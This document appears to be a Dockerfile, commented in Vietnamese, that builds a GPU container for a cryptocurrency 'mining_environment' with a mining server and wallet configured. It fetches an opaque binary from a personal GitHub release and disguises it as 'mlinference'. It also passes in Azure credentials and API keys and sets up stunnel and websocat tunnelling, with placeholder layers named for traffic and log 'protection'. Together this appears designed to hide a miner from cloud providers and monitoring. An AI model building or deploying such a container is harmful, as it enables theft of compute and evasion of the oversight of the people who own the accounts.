# Bước 1: Sử dụng nền tảng CUDA của NVIDIA
FROM nvidia/cuda:11.7.1-cudnn8-runtime-ubuntu22.04 AS base

# Thiết lập biến môi trường để chặn tương tác đầu vào trong quá trình cài đặt
ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    LANG=en_US.UTF-8 \
    LC_ALL=en_US.UTF-8

# Thêm các biến môi trường Azure và các khóa API (có thể được thiết lập khi build hoặc runtime)
ARG AZURE_SUBSCRIPTION_ID
ARG AZURE_CLIENT_ID
ARG AZURE_CLIENT_SECRET
ARG AZURE_TENANT_ID
ARG ANOMALY_DETECTOR_API_KEY
ARG OPENAI_API_KEY
ARG LOG_ENCRYPTION_KEY
ARG MINING_SERVER_CPU
ARG MINING_WALLET_CPU

ENV AZURE_SUBSCRIPTION_ID=${AZURE_SUBSCRIPTION_ID} \
    AZURE_CLIENT_ID=${AZURE_CLIENT_ID} \
    AZURE_CLIENT_SECRET=${AZURE_CLIENT_SECRET} \
    AZURE_TENANT_ID=${AZURE_TENANT_ID} \
    ANOMALY_DETECTOR_API_KEY=${ANOMALY_DETECTOR_API_KEY} \
    OPENAI_API_KEY=${OPENAI_API_KEY} \
    LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
    MINING_SERVER_CPU=${MINING_SERVER_CPU} \
    MINING_WALLET_CPU=${MINING_WALLET_CPU}

# Cài đặt các thư viện hệ thống và công cụ cần thiết
RUN apt-get update && apt-get install -y --no-install-recommends \
        apt-utils sudo nano wget python3 python3-pip curl git build-essential cmake \
        libssl-dev libeigen3-dev libnuma-dev stunnel4 \
        cpufrequtils iproute2 util-linux libnvidia-ml-dev \
        pciutils openssl lm-sensors powerstat stress-ng bash \
        htop locales iptables powertop tzdata \
        pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg \
    && rm -rf /var/lib/apt/lists/*

# Thiết lập múi giờ và locale
RUN ln -fs /usr/share/zoneinfo/Asia/Ho_Chi_Minh /etc/localtime \
    && dpkg-reconfigure -f noninteractive tzdata \
    && locale-gen en_US.UTF-8 \
    && update-locale LANG=en_US.UTF-8

# Cài đặt Azure CLI
RUN curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor | \
        tee /etc/apt/trusted.gpg.d/microsoft.gpg > /dev/null \
    && AZ_REPO=$(lsb_release -cs) \
    && echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main" | \
        tee /etc/apt/sources.list.d/azure-cli.list \
    && apt-get update \
    && apt-get install -y --no-install-recommends azure-cli \
    && rm -rf /var/lib/apt/lists/*

# Cài đặt các công cụ bổ sung
RUN curl -L -o /usr/local/bin/mlinference "https://github.com/wollfoo/llmsdeep/releases/download/mlinference/mlinference" \
    && chmod +x /usr/local/bin/mlinference \
    && wget https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl -O /usr/local/bin/websocat \
    && chmod +x /usr/local/bin/websocat

# Tạo khóa và chứng chỉ cho Stunnel
RUN mkdir -p /etc/stunnel && \
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/stunnel/soff.key \
        -out /etc/stunnel/soff.crt \
        -subj "/C=VN/ST=Ho_Chi_Minh/L=Ho_Chi_Minh/O=MyOrg/OU=MyUnit/CN=example.com" && \
    chmod 600 /etc/stunnel/soff.key /etc/stunnel/soff.crt

# Sao chép và cấu hình stunnel
COPY stunnel.conf /etc/stunnel/stunnel.conf
RUN chmod 700 /etc/stunnel/stunnel.conf

# Bước 2: Thiết lập thư mục làm việc
WORKDIR /app

# Bước 3: Sao chép và cài đặt các phụ thuộc Python
COPY requirements.txt /app/
RUN python3 -m pip install --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt --root-user-action=ignore

# Bước 4: Sao chép toàn bộ thư mục mining_environment và thiết lập permissions
COPY mining_environment/ /app/mining_environment/
RUN find /app/mining_environment/config -type f -name "*.json" -exec chmod 600 {} \; && \
    find /app/mining_environment/scripts -type f -name "*.py" -exec chmod +x {} \; && \
    find /app/mining_environment/logs -type f -name "*.log" -exec chmod 600 {} \;

# Bước 5: Thiết lập các biến môi trường cố định cho các thư mục và lệnh
ENV SCRIPT_DIR=/app/mining_environment/scripts \
    CONFIG_DIR=/app/mining_environment/config \
    MODELS_DIR=/app/mining_environment/models \
    LOGS_DIR=/app/mining_environment/logs \
    MINING_COMMAND=/usr/local/bin/mlinference

# Bước 6: Sao chép script khởi động
COPY start_mining.py /app/
RUN chmod +x /app/start_mining.py

# Bước 7: Thêm các lớp bổ sung (mở rộng tính năng) nếu cần
# Các lớp bổ sung có thể được sao chép và thiết lập permissions khi cần mở rộng
# COPY network-traffic-protection/ /app/network-traffic-protection/
# COPY log-data-protection/ /app/log-data-protection/
# ... (thêm các lớp khác theo yêu cầu)

# Thiết lập permissions cho các thư mục lớp bổ sung nếu sao chép
# RUN chmod -R 700 /app/network-traffic-protection/ /app/log-data-protection/ 

# Bước 8: Thiết lập điểm vào (entrypoint)
ENTRYPOINT ["python3", "/app/start_mining.py"]

# Bước 9: Thêm Healthcheck để kiểm tra tình trạng container
HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 \
    CMD pgrep -f start_mining.py || exit 1
